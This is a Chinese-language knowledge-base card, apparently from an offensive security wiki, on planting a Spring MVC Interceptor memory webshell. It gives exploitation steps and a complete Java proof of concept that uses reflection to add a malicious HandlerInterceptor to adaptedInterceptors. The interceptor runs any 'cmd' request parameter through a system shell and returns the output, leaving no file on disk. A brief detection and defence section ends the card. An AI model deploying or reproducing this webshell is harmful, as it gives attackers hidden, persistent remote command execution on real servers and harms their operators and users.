---
id: web-java-framework-spring-mvc-interceptor-memshell
title: Spring MVC Interceptor 内存马：反射注入 adaptedInterceptors
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-mvc-interceptor-memshell
tags:
- java
- spring
- spring-mvc
- memshell
- persistence
- interceptor
- handlerinterceptor
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:37:54+08:00'
  notes: 已对照原文4.1.1节核对：RequestContextUtils/RequestContextHolder取WebApplicationContext，getBean(RequestMappingHandlerMapping)，反射AbstractHandlerMapping.adaptedInterceptors并add恶意HandlerInterceptor，preHandle读cmd执行；原文拦截器在cmd存在时return true、否则false，卡内按正常业务语义改为cmd时return false、否则true，属修正写法，未实测。原文未给Spring受影响版本，未设置affected_versions。
url: /docs/web/java/framework/spring/web-java-framework-spring-mvc-interceptor-memshell/
draft: false
kb_aliases:
- Spring Interceptor 内存马
- adaptedInterceptors 注入
- HandlerInterceptor 内存马
- Spring MVC 拦截器 WebShell
- AbstractHandlerMapping adaptedInterceptors
---

## 一句话结论

在已能执行一次 Java 代码的 Spring MVC 应用中，取得 `RequestMappingHandlerMapping`（`AbstractHandlerMapping` 子类）并反射把恶意 `HandlerInterceptor` 加入 `adaptedInterceptors` 列表；此后每个匹配的请求都会在进入 Controller 前执行 `preHandle`，形成不新增路由、不落文件的 Interceptor 内存马。

## 原理

- Spring MVC 请求流程：`DispatcherServlet.doDispatch` → `getHandler(request)` → `AbstractHandlerMapping.getHandler` → `getHandlerExecutionChain`；后者把 `adaptedInterceptors` 中匹配当前请求的拦截器加入 `HandlerExecutionChain`。
- 随后 `HandlerExecutionChain.applyPreHandle` 依次调用拦截器的 `preHandle`，再执行 Controller。
- `AbstractHandlerMapping` 的 `adaptedInterceptors` 是 `ArrayList<HandlerInterceptor>`，在初始化时由 `interceptors` 转换而来；运行期直接反射拿到该列表并 `add` 恶意拦截器即可生效，无需走 `WebMvcConfigurer.addInterceptors` 的启动期注册。
- 恶意 `preHandle` 从 `HttpServletRequest` 读取 `cmd` 参数并执行命令；由于在 Controller 之前执行，不需要新增 `@RequestMapping` 路由，也不受网关只放行既有业务路径的白名单限制。

## 触发条件

- 目标为 Spring MVC（非 WebFlux）应用；
- 攻击者已能执行一次 Java 代码、SpEL 或具备 JSP 执行能力；
- 能取得 `WebApplicationContext` 与 `RequestMappingHandlerMapping` Bean；
- `adaptedInterceptors` 未被安全框架代理或不可反射访问。

## 利用步骤

1. 通过 `RequestContextHolder` + `ServletRequestAttributes` 取当前请求，或用 `RequestContextUtils.getWebApplicationContext(request)` 取 `WebApplicationContext`。
2. `context.getBean(RequestMappingHandlerMapping.class)` 得到 `RequestMappingHandlerMapping`（其父类为 `AbstractHandlerMapping`）。
3. 反射 `AbstractHandlerMapping.adaptedInterceptors`，`setAccessible(true)` 后取得 `ArrayList`。
4. 编写实现 `HandlerInterceptor` 的恶意类，在 `preHandle` 中读取 `cmd` 并执行；命令存在时返回 `false` 阻断后续业务，否则返回 `true`。
5. `adaptedInterceptors.add(evilInterceptor)`。
6. 访问任意业务路径携带 `?cmd=...` 验证；删除植入文件不失效，重启应用清除。

## PoC

```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.ArrayList;

public class InjectInterceptor {
  public static void inject() throws Exception {
    WebApplicationContext ctx = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
        .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

    AbstractHandlerMapping mapping = (AbstractHandlerMapping) ctx.getBean(RequestMappingHandlerMapping.class);
    Field f = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    f.setAccessible(true);
    ArrayList<Object> list = (ArrayList<Object>) f.get(mapping);

    list.add(new HandlerInterceptor() {
      @Override
      public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) throws Exception {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
          String[] c = System.getProperty("os.name").toLowerCase().contains("win")
              ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
          Process p = Runtime.getRuntime().exec(c);
          java.util.Scanner s = new java.util.Scanner(p.getInputStream(), "GBK").useDelimiter("\\A");
          resp.setCharacterEncoding("GBK");
          resp.getWriter().write(s.hasNext() ? s.next() : "");
          resp.getWriter().flush();
          return false;
        }
        return true;
      }
    });
  }
}
```

## 变体与关联

- 变体：`WebApplicationContext` 还可用 `ContextLoader.getCurrentWebApplicationContext()`、`WebApplicationContextUtils.getWebApplicationContext(...)`、`RequestContextUtils.getWebApplicationContext(request)` 获取。
- 变体：除 `adaptedInterceptors` 外，也可注册 `MappedInterceptor` 到 `interceptors` 字段，但运行期直接改 `adaptedInterceptors` 最简单。
- 关联：[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（动态添加 Controller 路由的另一种 Spring MVC 内存马）；[[web-java-framework-spring-webflux-filteringwebhandler-memshell]]（WebFlux 对应物）。
- 边界：仅 Spring MVC；WebFlux 无 Interceptor 概念；重启清空；Spring 版本差异需确认字段名仍为 `adaptedInterceptors`。

## 检测与防御

- 检测：运行期 `AbstractHandlerMapping.adaptedInterceptors` 出现非业务包、匿名类或类名随机的拦截器；请求在进入 Controller 前出现异常命令执行栈；JSP/SpEL 中出现 `adaptedInterceptors` 字符串。
- 处置：重启应用；Arthas/内存 dump 枚举所有 `HandlerMapping` 的拦截器列表。
- 防御：封堵任意代码执行入口；RASP 监控 `adaptedInterceptors.add`；对 Spring 上下文中的动态 Bean/拦截器做基线比对。
